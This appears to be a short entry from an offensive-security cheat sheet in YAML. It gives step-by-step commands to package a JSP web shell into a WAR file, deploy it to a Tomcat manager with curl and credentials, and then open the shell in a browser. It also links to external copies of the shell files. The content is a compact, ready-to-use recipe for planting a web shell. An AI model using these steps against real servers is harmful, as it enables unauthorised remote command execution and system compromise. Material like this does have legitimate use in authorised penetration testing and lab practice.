---
functions:
  shell:
    - description: WAR and jsp web shell
      
---
code: |
        (1) File Structure:
        	── shell.jsp
			    ── WEB-INF
		    	    ── web.xml
		(2) jar -cf shell.war *
        (3) curl --upload-file shell.war http://10.10.10.194:8080/manager/text/deploy?path=/{context}&update=true -u {username}
        (4) https://{address}/{context}
resources:
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/shell.jsp
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/web.xml